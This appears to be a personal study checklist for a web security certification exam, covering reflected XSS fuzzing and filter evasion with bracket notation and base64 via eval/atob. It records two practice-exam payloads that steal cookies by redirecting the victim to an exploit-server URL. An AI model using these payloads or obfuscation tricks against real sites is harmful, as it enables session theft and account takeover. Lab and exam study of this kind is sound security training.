- [ ] For these fields, you will input the fuzzer `<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer` to potentially identify XSS on an input field.
- [ ] If a field looks like a potentially valid area, you are going to want to input a field, capture it in HTTP History, selecting the input and the right clicking, select **Scan Selected Insertion point** as shown in the screenshot below: ![[Technical/Web/Methodology/BSCP Security Testing Checklist/Images/Pasted image 20250927235309.png]]
- [ ] If you need avoid `.` in your payloads, instead of `document.cookie`, you can substitute this and instead run `[document]["cookie"]` as a replacement. We need the double quotes on the end because `["cookie"]` is a string literal used as a property name, while `[cookie]` is a variable. This whole thing is known as bracket notation https://www.freecodecamp.org/news/dot-notation-vs-square-brackets-javascript/
- [ ] You can also try base64 encoding a payload and using `eval` and `atob` doing `eval(atob("BASE64_ENCODED_PAYLOAD"))`


## Payloads that have worked in the past
**Reflected XSS Delivered to Steal Cookies (Practice Exam 2)**:
  - Started with the fuzzer, identified `/?find=%22%7D%3Bdocument.location%3D%27https%3A%2F%2Fexploit-0a9c00fc0384d7f8807f022101cd00bd.exploit-server.net%2Fvalues%3Fvalue%3D%27%2Bdocument.cookie%3B%2F%2F` would send over a cookie to the exploit sever, URL decoded this was `/?find="};document.location='https://exploit-0a9c00fc0384d7f8807f022101cd00bd.exploit-server.net/values?value='+document.cookie;//`
  - The payload body we sent to the victim was 
``` javascript
<script>
document.location = "https://0abc00d80341d72f808003c9008f008d.web-security-academy.net/?find="};document.location='https://exploit-0a9c00fc0384d7f8807f022101cd00bd.exploit-server.net/values?value='+document.cookie;//"
</script>
``` 

**Reflected XSS Delivered to Steal Cookies (Practice Exam 1)**
* Started with fuzzer which popped an alert up, refined this to find the payload `"-alert()-"` to work but found that this didn't allow any `.` 
* We relied on the atob trick to sneak a `.` by inputting the following that translates the base64 to `alert(document.cookie)`
``` javascript
"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))-"
```
* Finally we weaponise it with the payload `document.location="https://exploit-0a48005f03bcd0308082111c01e900d0.exploit-server.net/value?value="+document.cookie` and base64 encode this and wrap around atob to then put in a script tag in our exploit server and send over to our victim to leak the cookie:
``` javascript
<script>
document.location="https://0afc00af036bd0bb80a412020025002d.web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXhwbG9pdC0wYTQ4MDA1ZjAzYmNkMDMwODA4MjExMWMwMWU5MDBkMC5leHBsb2l0LXNlcnZlci5uZXQvdmFsdWU%2FdmFsdWU9Iitkb2N1bWVudC5jb29raWU%3D%22%29%29-%22"
</script>
```
![[Technical/Web/Methodology/BSCP Security Testing Checklist/Images/Pasted image 20250928125041.png]]